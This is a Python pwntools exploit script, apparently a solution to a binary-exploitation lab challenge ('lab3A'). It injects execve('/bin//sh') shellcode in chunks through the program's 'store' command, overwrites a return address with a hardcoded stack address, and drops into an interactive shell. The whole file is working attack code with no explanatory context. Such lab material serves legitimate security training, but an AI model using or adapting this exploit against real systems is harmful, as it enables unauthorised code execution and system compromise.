from pwn import *
import struct


shellcode = "\x31\xDB\x31\xC9\xF7\xE3\xEB\x04" + "\xB0\x0B\x52\x90\x90\x90\xEB\x04" + "\x68\x6E\x2F\x73\x68\x90\xEB\x04" + "\x68\x2F\x2F\x62\x69\x90\xEB\x04" + "\x89\xE3\x52\x53\x89\xE1\xEB\x04" + "\xCD\x80\x90\x90\x90\x90\x90\x90"
r = process(["/tmp/transcen/r.sh", "/levels/lab03/lab3A"])

def store(idx, opcode):
    r.sendline("store")
    r.sendline(str(struct.unpack('<I', opcode[:4])[0]))
    r.sendline(str(idx))
    log.info("int: {0}, idx: {1}".format(struct.unpack('<I', opcode[:4])[0], idx))

    r.sendline("store")
    r.sendline(str(struct.unpack('<I', opcode[4:])[0]))
    r.sendline(str(idx+1))
    log.info("int: {0}, idx: {1}".format(struct.unpack('<I', opcode[4:])[0], idx+1))

store(1, shellcode[0:8])
store(4, shellcode[8:16])
store(7, shellcode[16:24])
store(10, shellcode[24:32])
store(13, shellcode[32:40])
store(16, shellcode[40:48])

r.sendline("store")
r.sendline(str(struct.unpack('<I',  p32(0xbffff51c))[0]))
r.sendline(str(109))

r.sendline("quit")
r.interactive()
